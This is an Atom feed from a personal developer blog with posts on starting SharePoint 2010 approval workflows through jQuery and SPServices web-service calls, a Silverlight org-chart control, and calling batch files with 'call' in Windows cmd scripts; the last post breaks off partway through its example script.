<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
 
 <title>Madhur's Blog</title>
 <link href="http://madhur.co.in/atom.xml" rel="self"/>
 <link href="http://madhur.co.in/blogindex.html/"/>
 <updated>2012-02-01T08:49:22+05:30</updated>
 <id>http://madhur.co.in/blogindex.html</id>
 <author>
   <name>Madhur Ahuja</name>
   <email>ahuja.madhur@gmail.com</email>
 </author>
 
 
 <entry>
   <title>Invoke SharePoint 2010 Approval Workflow with Dynamic Approvers using Web Services and Jquery</title>
   <link href="http://madhur.co.in/blog/2012/01/09/spworkflowapprovers.html"/>
   <updated>2012-01-09T00:00:00+05:30</updated>
   <id>id:/blog/2012/01/09/spworkflowapprovers</id>
   <content type="html">&lt;p&gt;In this post, I am going to show you how you can execute out of the box SharePoint 2010 approval workflow with dynamic approvers.&lt;/p&gt;

&lt;p&gt;Let&amp;#8217;s say, you have a list on which you have Approval workflow configured and you want the approver to be picked from the Person or Group type field from within the list.&lt;/p&gt;

&lt;p&gt;Let&amp;#8217;s assume , the ID is being specified in the query string of the page such as&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;StartWorfklow.aspx?ItemID=5&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I will be making use of &lt;a href='http://jquery.com'&gt;Jquery&lt;/a&gt; and &lt;a href='http://spservices.codeplex.com'&gt;SPServices&lt;/a&gt; from codeplex for this purpose.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;First of all, we will retrieve the our specified item from this list and then retrieve the value of this Person or Group field.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='javascript'&gt;&lt;span class='kd'&gt;var&lt;/span&gt; &lt;span class='nx'&gt;ItemID&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt; &lt;span class='nx'&gt;getParameterByName&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;ItemID&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;

&lt;span class='c1'&gt;// Construct the CAML Query&lt;/span&gt;
&lt;span class='kd'&gt;var&lt;/span&gt; &lt;span class='nx'&gt;CamlQuery&lt;/span&gt; &lt;span class='o'&gt;=&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;&amp;lt;Query&amp;gt;&amp;lt;Where&amp;gt;&amp;lt;Eq&amp;gt;&amp;lt;FieldRef Name=&amp;#39;ID&amp;#39; /&amp;gt;&amp;lt;Value Type=&amp;#39;Counter&amp;#39;&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;&lt;span class='nx'&gt;ItemID&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;&amp;lt;/Value&amp;gt;&amp;lt;/Eq&amp;gt;&amp;lt;/Where&amp;gt;&amp;lt;/Query&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;

 
&lt;span class='c1'&gt;// Fire GetListItems web service to find the Approval contact&lt;/span&gt;
&lt;span class='nx'&gt;$&lt;/span&gt;&lt;span class='p'&gt;().&lt;/span&gt;&lt;span class='nx'&gt;SPServices&lt;/span&gt;&lt;span class='p'&gt;({&lt;/span&gt;
    &lt;span class='nx'&gt;operation&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;GetListItems&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
    &lt;span class='nx'&gt;async&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='kc'&gt;false&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
    &lt;span class='nx'&gt;CAMLQuery&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='nx'&gt;CamlQuery&lt;/span&gt; &lt;span class='p'&gt;,&lt;/span&gt;
    &lt;span class='nx'&gt;listName&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;Intake Requests&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
    &lt;span class='nx'&gt;CAMLViewFields&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;&amp;lt;ViewFields&amp;gt;&amp;lt;FieldRef Name=&amp;#39;Band_x0020_45_x0020_Approval&amp;#39; /&amp;gt;&amp;lt;/ViewFields&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
    &lt;span class='nx'&gt;completefunc&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='kd'&gt;function&lt;/span&gt; &lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='nx'&gt;xData&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='nx'&gt;Status&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt; 
	&lt;span class='p'&gt;{&lt;/span&gt;
        
        &lt;span class='nx'&gt;events&lt;/span&gt; &lt;span class='o'&gt;=&lt;/span&gt; &lt;span class='k'&gt;new&lt;/span&gt; &lt;span class='nb'&gt;Array&lt;/span&gt;&lt;span class='p'&gt;();&lt;/span&gt;
        &lt;span class='nx'&gt;$&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='nx'&gt;xData&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;responseXML&lt;/span&gt;&lt;span class='p'&gt;).&lt;/span&gt;&lt;span class='nx'&gt;find&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;z\\:row&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;).&lt;/span&gt;&lt;span class='nx'&gt;each&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='kd'&gt;function&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt; 
		&lt;span class='p'&gt;{&lt;/span&gt;
				
                &lt;span class='nx'&gt;approverName&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;&lt;span class='nx'&gt;$&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;).&lt;/span&gt;&lt;span class='nx'&gt;attr&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;ows_Band_x0020_45_x0020_Approval&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
				&lt;span class='kd'&gt;var&lt;/span&gt; &lt;span class='nx'&gt;index&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;&lt;span class='nx'&gt;approverName&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;indexOf&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;;&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
				&lt;span class='nx'&gt;approverID&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;&lt;span class='nx'&gt;approverName&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;slice&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='mi'&gt;0&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;&lt;span class='nx'&gt;index&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
				
				&lt;span class='nx'&gt;approverName&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;&lt;span class='nx'&gt;approverName&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;substring&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='nx'&gt;index&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;&lt;span class='mi'&gt;2&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;&lt;span class='nx'&gt;approverName&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;length&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
				
          
			
        &lt;span class='p'&gt;})&lt;/span&gt;
    &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='p'&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;When we retrieve the person or group field from the web services, it is returned as &lt;strong&gt;1;#Madhur Ahuja&lt;/strong&gt;. Where 1 is the ID of the row in User Information List and &lt;strong&gt;Madhur Ahuja&lt;/strong&gt; is the display name. To pass it to Approval Workflow, we need the login name.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We will query the &lt;strong&gt;User Information List&lt;/strong&gt; to obtain the login name.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='javascript'&gt;&lt;span class='c1'&gt;// We will just get the DisplayName and ID, but not the Login Name, we will fire another web service to fetch the loginName of the User &lt;/span&gt;
&lt;span class='k'&gt;if&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='nx'&gt;approverName&lt;/span&gt;&lt;span class='o'&gt;!=&lt;/span&gt;&lt;span class='kc'&gt;null&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
&lt;span class='p'&gt;{&lt;/span&gt;
		
		 &lt;span class='kd'&gt;var&lt;/span&gt; &lt;span class='nx'&gt;xmlData&lt;/span&gt; &lt;span class='o'&gt;=&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;&amp;lt;soap:Envelope xmlns:soap=&amp;#39;http://schemas.xmlsoap.org/soap/envelope/&amp;#39; xmlns:xsi=&amp;#39;http://www.w3.org/2001/XMLSchema-instance&amp;#39; xmlns:xsd=&amp;#39;http://www.w3.org/2001/XMLSchema&amp;#39;&amp;gt;&amp;lt;soap:Body&amp;gt;&amp;lt;GetListItems xmlns=&amp;#39;http://schemas.microsoft.com/sharepoint/soap/&amp;#39;&amp;gt;&amp;lt;listName&amp;gt;User Information List&amp;lt;/listName&amp;gt;&amp;lt;query&amp;gt;&amp;lt;Query xmlns=&amp;#39;&amp;#39;&amp;gt;&amp;lt;Where&amp;gt;&amp;lt;Eq&amp;gt;&amp;lt;FieldRef Name=&amp;#39;ID&amp;#39; /&amp;gt;&amp;lt;Value Type=&amp;#39;Counter&amp;#39;&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;&lt;span class='nx'&gt;approverID&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;&amp;lt;/Value&amp;gt;&amp;lt;/Eq&amp;gt;&amp;lt;/Where&amp;gt;&amp;lt;OrderBy&amp;gt;&amp;lt;FieldRef Name=&amp;#39;Title&amp;#39; /&amp;gt;&amp;lt;/OrderBy&amp;gt;&amp;lt;/Query&amp;gt;&amp;lt;/query&amp;gt;&amp;lt;viewFields&amp;gt;&amp;lt;ViewFields xmlns=&amp;#39;&amp;#39; /&amp;gt;&amp;lt;/viewFields&amp;gt;&amp;lt;queryOptions&amp;gt;&amp;lt;QueryOptions xmlns=&amp;#39;&amp;#39; /&amp;gt;&amp;lt;/queryOptions&amp;gt;&amp;lt;/GetListItems&amp;gt;&amp;lt;/soap:Body&amp;gt;&amp;lt;/soap:Envelope&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;

		 &lt;span class='nx'&gt;$&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;ajax&lt;/span&gt;&lt;span class='p'&gt;({&lt;/span&gt;
		   &lt;span class='nx'&gt;url&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;/sites/nishantverma/_vti_bin/lists.asmx&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
		   &lt;span class='nx'&gt;type&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
		   &lt;span class='nx'&gt;async&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='kc'&gt;false&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
		   &lt;span class='nx'&gt;dataType&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;xml&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
		   &lt;span class='nx'&gt;data&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='nx'&gt;xmlData&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; 
		   &lt;span class='nx'&gt;complete&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt;&lt;span class='nx'&gt;SuccessFunc&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
		   &lt;span class='nx'&gt;error&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='nx'&gt;ErrorFunc&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
		   &lt;span class='nx'&gt;contentType&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;text/xml; charset=\&amp;quot;utf-8\&amp;quot;&amp;quot;&lt;/span&gt;
		  &lt;span class='p'&gt;});&lt;/span&gt;
		  
		  &lt;span class='kd'&gt;function&lt;/span&gt; &lt;span class='nx'&gt;SuccessFunc&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='nx'&gt;result&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
		  &lt;span class='p'&gt;{&lt;/span&gt;
			&lt;span class='c1'&gt;//xml node with namespace need to be handled differently for jQuery&lt;/span&gt;
			 &lt;span class='nx'&gt;$&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='nx'&gt;result&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;responseXML&lt;/span&gt;&lt;span class='p'&gt;).&lt;/span&gt;&lt;span class='nx'&gt;find&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;z\\:row&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;).&lt;/span&gt;&lt;span class='nx'&gt;each&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='kd'&gt;function&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt; 
			 &lt;span class='p'&gt;{&lt;/span&gt;
				
				&lt;span class='nx'&gt;loginName&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;&lt;span class='nx'&gt;$&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;).&lt;/span&gt;&lt;span class='nx'&gt;attr&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;ows_Name&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
				
				
			&lt;span class='p'&gt;});&lt;/span&gt;
		&lt;span class='p'&gt;}&lt;/span&gt;

		&lt;span class='kd'&gt;function&lt;/span&gt; &lt;span class='nx'&gt;ErrorFunc&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='nx'&gt;result&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt; 
		&lt;span class='p'&gt;{&lt;/span&gt;
					&lt;span class='nx'&gt;alert&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='nx'&gt;result&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;responseText&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
		&lt;span class='p'&gt;}&lt;/span&gt;
		
&lt;span class='p'&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;We get the login name in the variable &lt;strong&gt;ows_Name&lt;/strong&gt;. Now we can fire the Approval workflow passing it the login name. Note the &lt;strong&gt;templateId&lt;/strong&gt; below, its the GUID of the SharePoint 2010 Approval workflow which is associated with the list.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='javascript'&gt; &lt;span class='nx'&gt;$&lt;/span&gt;&lt;span class='p'&gt;().&lt;/span&gt;&lt;span class='nx'&gt;SPServices&lt;/span&gt;&lt;span class='p'&gt;({&lt;/span&gt;
				&lt;span class='nx'&gt;operation&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;StartWorkflow&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
				&lt;span class='nx'&gt;item&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;http://sp.madhurmoss.com/sites/nishantverma/GBSRequest/Lists/Intake%20Requests/&amp;quot;&lt;/span&gt; &lt;span class='o'&gt;+&lt;/span&gt; &lt;span class='nx'&gt;ItemID&lt;/span&gt; &lt;span class='o'&gt;+&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;_.000&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
				&lt;span class='nx'&gt;templateId&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='s2'&gt;&amp;quot;{10E4D465-A9B6-4146-BD50-E9A78888548D}&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
				&lt;span class='nx'&gt;workflowParameters&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='nx'&gt;assocData&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt;
				&lt;span class='nx'&gt;completefunc&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='kd'&gt;function&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt; 
				&lt;span class='p'&gt;{&lt;/span&gt;
					&lt;span class='nx'&gt;$&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;#intake&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;).&lt;/span&gt;&lt;span class='nx'&gt;html&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot;Your Intake Request has been sent to &amp;quot;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;&lt;span class='nx'&gt;approverName&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;&lt;span class='s2'&gt;&amp;quot; for his approval. Thanks for submitting the request. This page will redirect to homepage after few seconds&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
					
					&lt;span class='nb'&gt;window&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;setTimeout&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='kd'&gt;function&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt; 
					&lt;span class='p'&gt;{&lt;/span&gt;
						&lt;span class='nb'&gt;window&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;location&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='nx'&gt;href&lt;/span&gt; &lt;span class='o'&gt;=&lt;/span&gt; &lt;span class='s1'&gt;&amp;#39;/sites/nishantverma/GBSRequest&amp;#39;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
					&lt;span class='p'&gt;},&lt;/span&gt; &lt;span class='mi'&gt;5000&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
				&lt;span class='p'&gt;}&lt;/span&gt;
			  &lt;span class='p'&gt;});&lt;/span&gt;
			  
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Here, the key is the variable &lt;em&gt;assocData&lt;/em&gt;, which is nothing but the Association Data of the workflow. In SharePoint 2010 Approval workflow, its the serialized XML of the infopath form. This variable is defnied as the XML string as below:&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='javascript'&gt;			&lt;span class='kd'&gt;var&lt;/span&gt; &lt;span class='nx'&gt;assocData&lt;/span&gt;&lt;span class='o'&gt;=&lt;/span&gt;&lt;span class='s1'&gt;&amp;#39;&amp;lt;dfs:myFields xmlns:xsd=&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot; xmlns:dms=&amp;quot;http://schemas.microsoft.com/office/2009/documentManagement/types&amp;quot; xmlns:dfs=&amp;quot;http://schemas.microsoft.com/office/infopath/2003/dataFormSolution&amp;quot; xmlns:q=&amp;quot;http://schemas.microsoft.com/office/infopath/2009/WSSList/queryFields&amp;quot; xmlns:d=&amp;quot;http://schemas.microsoft.com/office/infopath/2009/WSSList/dataFields&amp;quot; xmlns:ma=&amp;quot;http://schemas.microsoft.com/office/2009/metadata/properties/metaAttributes&amp;quot; xmlns:pc=&amp;quot;http://schemas.microsoft.com/office/infopath/2007/PartnerControls&amp;quot; xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;dfs:queryFields&amp;gt;&amp;lt;/dfs:queryFields&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;dfs:dataFields&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:SharePointListItem_RW&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:Approvers&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
 
 
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:Assignment&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
 
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:Assignee&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;pc:Person&amp;gt;&amp;lt;pc:DisplayName&amp;gt;&amp;lt;/pc:DisplayName&amp;gt;&amp;lt;pc:AccountId&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;&lt;span class='nx'&gt;loginName&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;&lt;span class='s1'&gt;&amp;#39;&amp;lt;/pc:AccountId&amp;gt;&amp;lt;pc:AccountType&amp;gt;User&amp;lt;/pc:AccountType&amp;gt;&amp;lt;/pc:Person&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;/d:Assignee&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
 
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:Stage xsi:nil=&amp;quot;true&amp;quot; /&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:AssignmentType&amp;gt;Serial&amp;lt;/d:AssignmentType&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
 
&lt;span class='s1'&gt;&amp;#39;&amp;lt;/d:Assignment&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
 
&lt;span class='s1'&gt;&amp;#39;&amp;lt;/d:Approvers&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
 
 
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:ExpandGroups&amp;gt;true&amp;lt;/d:ExpandGroups&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:NotificationMessage&amp;gt;Please approve&amp;lt;/d:NotificationMessage&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:DueDateforAllTasks xsi:nil=&amp;quot;true&amp;quot; /&amp;gt;&amp;lt;d:DurationforSerialTasks xsi:nil=&amp;quot;true&amp;quot; /&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:DurationUnits&amp;gt;Day&amp;lt;/d:DurationUnits&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:CC /&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:CancelonRejection&amp;gt;true&amp;lt;/d:CancelonRejection&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:CancelonChange&amp;gt;false&amp;lt;/d:CancelonChange&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;d:EnableContentApproval&amp;gt;false&amp;lt;/d:EnableContentApproval&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;/d:SharePointListItem_RW&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;/dfs:dataFields&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='o'&gt;+&lt;/span&gt;
&lt;span class='s1'&gt;&amp;#39;&amp;lt;/dfs:myFields&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The full code can be downloaded from my &lt;a href='https://gist.github.com/1584225'&gt;gist&lt;/a&gt; here.&lt;/p&gt;</content>
 </entry>
 
 <entry>
   <title>Silverlight Chart Control for SharePoint 2010</title>
   <link href="http://madhur.co.in/blog/2011/12/29/slchart.html"/>
   <updated>2011-12-29T00:00:00+05:30</updated>
   <id>id:/blog/2011/12/29/slchart</id>
   <content type="html">&lt;p&gt;I have pieced together a silverlight control for SharePoint 2010. The .XAP file and the source code is hosted at this &lt;a href='http://madhur.codeplex.com'&gt;codeplex project&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can see a live demo at this &lt;a href='/silverdemo/Index.html'&gt;location&lt;/a&gt;&lt;/p&gt;

&lt;h2 id='key_features'&gt;Key Features&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Collapse/Expand of Nodes&lt;/li&gt;

&lt;li&gt;Reset Root anywhere within the Org Chart&lt;/li&gt;

&lt;li&gt;Root can be permanently set in web part through parameters&lt;/li&gt;

&lt;li&gt;Optionally draws dotted line based on input data.&lt;/li&gt;
&lt;/ul&gt;</content>
 </entry>
 
 <entry>
   <title>Windows command shell(cmd.exe) runs only first command</title>
   <link href="http://madhur.co.in/blog/2011/12/29/cmdshellfirst.html"/>
   <updated>2011-12-29T00:00:00+05:30</updated>
   <id>id:/blog/2011/12/29/cmdshellfirst</id>
   <content type="html">&lt;p&gt;If you written a command shell script and it exits after executing only first command, its probably because one of the command in the command script is itself a command script. In that case, such script needs to be called using the &lt;em&gt;call&lt;/em&gt; command.&lt;/p&gt;

&lt;p&gt;For example,&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;@echo off
echo &amp;quot;Building Content&amp;quot;
jekyll --no-server --no-auto

echo &amp;quot;Checking out master&amp;quot;
git checkout master


echo &amp;quot;Copying the updated content to root&amp;quot;
cp -r _site/* . &amp;amp;&amp;amp; rm -rf _site/ &amp;amp;&amp;amp; touch .nojekyll

echo &amp;quot;Adding the content&amp;quot;
git add .

echo &amp;quot;Updated content&amp;quot;
git commit -am &amp;quot;Updated content&amp;quot;

echo &amp;quot;Pushed content&amp;quot;
git push --all origin
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The above script will simply exit after running the first command. This is because Jekyll itself runs as a batch file in Windows. To correct this, we need to call Jekyll with the use of &lt;em&gt;call&lt;/em&gt; command&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;@echo off
echo &amp;quot;Building Content&amp;quot;
call jekyll --no-server --no-auto

echo &amp;quot;Checking out master&amp;quot;
git checkout master


echo &amp;quot;Copying the updated content to root&amp;quot;
